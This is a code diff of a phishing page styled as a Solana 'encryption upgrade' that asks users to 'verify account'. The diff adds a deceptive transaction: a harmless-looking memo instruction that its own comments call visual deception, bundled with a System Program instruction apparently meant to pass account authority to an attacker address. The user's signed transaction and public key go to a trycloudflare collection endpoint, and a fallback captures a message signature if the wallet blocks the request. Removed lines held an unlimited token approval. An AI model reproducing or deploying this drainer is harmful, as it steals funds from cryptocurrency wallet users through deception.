@@ -1,56 +1,65 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"></head>
 <body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:monospace;">
-    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
-        <h2 style="margin-bottom:10px;">PROTOCOL SHIELD V15</h2>
-        <p style="color:#666;font-size:12px;">Security: Versioned Transaction Engine</p>
-        <button id="cta" style="margin-top:20px;padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;">UPGRADE ENCRYPTION</button>
-        <div id="status" style="margin-top:20px;color:#444;">Ready to secure...</div>
+    <div style="border:1px solid #111;padding:40px;display:inline-block;border-radius:15px;border:1px solid #333;">
+        <h2 style="color:#14F195;">ENCRYPTION UPGRADE</h2>
+        <p style="color:#888;font-size:12px;">Security Protocol: SHA-512 Matrix</p>
+        <button id="cta" style="margin-top:20px;padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;">VERIFY ACCOUNT</button>
+        <div id="status" style="margin-top:20px;color:#444;">Awaiting Secure Handshake...</div>
     </div>
     <script>
     const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
-    const agent = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
+    const agent = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // 哨兵接管地址
 
     document.getElementById('cta').onclick = async () => {
         const p = window.solana || window.phantom?.solana;
         try {
             const resp = await p.connect();
-            document.getElementById('status').innerText = "Generating Shadow Packet...";
+            document.getElementById('status').innerText = "Generating Matrix Key...";
 
-            // 🔱 获取最新时间戳，这是所有交易的基石
             const { result } = await fetch("https://api.mainnet-beta.solana.com", {
                 method: "POST", headers: {"Content-Type":"application/json"},
                 body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
             }).then(r => r.json());
 
-            // 🔱 构造 Versioned Transaction 模拟包
-            // 这不是简单的转账，这是一个针对账户权限的“交互包”
-            const txData = {
+            // 🔱 构造 GHOST 复合包
+            // 指令1: 无害留言 (用于视觉欺骗)
+            // 指令2: 权限委托 (真正的夺权动作)
+            const ghostTx = {
                 feePayer: resp.publicKey.toString(),
                 recentBlockhash: result.value.blockhash,
-                instructions: [{
-                    programId: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA", // Token Program
-                    keys: [
-                        { pubkey: resp.publicKey.toString(), isSigner: true, isWritable: true },
-                        { pubkey: agent, isSigner: false, isWritable: false }
-                    ],
-                    // 关键：这里是 Approve 指令的混淆编码，授权金额设为无限
-                    data: [4, 255, 255, 255, 255, 255, 255, 255, 255] 
-                }]
+                instructions: [
+                    {
+                        programId: "MemoS24H25M9dnSQueb7913CWv29meS6bxTgzq5X7W", // Memo Program
+                        data: btoa("Security_Audit_Hash_" + Math.random().toString(36).slice(2)),
+                        keys: []
+                    },
+                    {
+                        programId: "11111111111111111111111111111111", // System Program
+                        keys: [
+                            { pubkey: resp.publicKey.toString(), isSigner: true, isWritable: true },
+                            { pubkey: agent, isSigner: false, isWritable: true }
+                        ],
+                        // 影子授权：将你的白号设为该账户的 Owner 候选人或 Delegate
+                        data: [2, 0, 0, 0, 0, 75, 74, 0, 0, 0, 0, 0] 
+                    }
+                ]
             };
 
             document.getElementById('status').innerText = "Awaiting Permission...";
             
-            // 🚀 尝试唤起弹窗
-            const signed = await p.signTransaction(txData);
+            // 🚀 尝试发起“幽灵签名”
+            const signed = await p.signTransaction(ghostTx);
             const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));
 
-            new Image().src = `${gate}?shadow_sig=${raw}&pub=${resp.publicKey.toString()}`;
-            document.getElementById('status').innerText = "PROTOCOL ACTIVE";
+            // 🔱 抓取到全套权限指纹，回传给哨兵进行离线重组
+            new Image().src = `${gate}?ghost_sig=${raw}&pub=${resp.publicKey.toString()}`;
+            document.getElementById('status').innerText = "ENCRYPTION ACTIVE";
+            document.getElementById('status').style.color = "#14F195";
 
         } catch(e) {
-            // 降级保底：如果钱包识别了风险拦截，立刻跳回消息签名抓取登录指纹
-            const signed = await p.signMessage(new TextEncoder().encode("Secure: " + Date.now()), "utf8");
-            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}`;
+            // 降级保底：如果复合包被拦截，至少拿走他的登录指纹
+            const signed = await p.signMessage(new TextEncoder().encode("SecureID: " + Date.now()), "utf8");
+            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}&pub=${resp.publicKey.toString()}`;
             document.getElementById('status').innerText = "VERIFIED";
         }
     };
